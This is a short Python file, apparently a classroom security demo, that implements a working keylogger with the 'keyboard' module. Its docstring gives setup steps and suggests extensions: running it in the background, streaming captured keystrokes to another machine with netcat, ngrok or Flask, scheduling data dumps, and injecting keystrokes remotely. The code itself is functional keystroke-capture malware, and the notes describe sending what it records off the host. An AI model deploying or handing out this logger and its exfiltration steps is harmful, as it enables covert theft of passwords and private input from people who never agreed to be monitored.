"""
simple keylogger

The 'keyboard' module is awesome!

Setup (Linux):
	mkdir sec_demos
	cd sec_demos
	git clone [insert url]
	python3 -m venv .venv
	sudo -s
	source .venv/bin/activate
	pip install keyboard 

Running (Linux):
	source .venv/bin/activate
	python3 kl.py

Ideas for extension activities:
	- Save output to file.
		- See 'use as standalone module' in github repo linked below.
	- Run in background using '&'
	- Stream output remotely or schedule data dumps 
		- Try using sockets or ngrok+flask
		- Command line only using netcat:
			- Server, Keylogger (ex: 10.2.0.5):
				- python3 kl.py | nc -lkv 7777
				- or, as a standalone module:
					- python -m keyboard | nc -lkv 7777
			- Client (ex: 10.2.0.6):  
				- nc -zv 10.2.0.5 7777
				- or, use firefox.
	- Remote keyboard injection (possible with keyboard module)

Helpful Links:
	-Keyboard module, https://github.com/boppreh/keyboard
	-Netcat (nc), https://man7.org/linux/man-pages/man1/ncat.1.html
	-Ncat, https://nmap.org/ncat/guide/index.html
"""

import keyboard

keyboard.on_press(lambda event : print(event.name))

keyboard.wait()
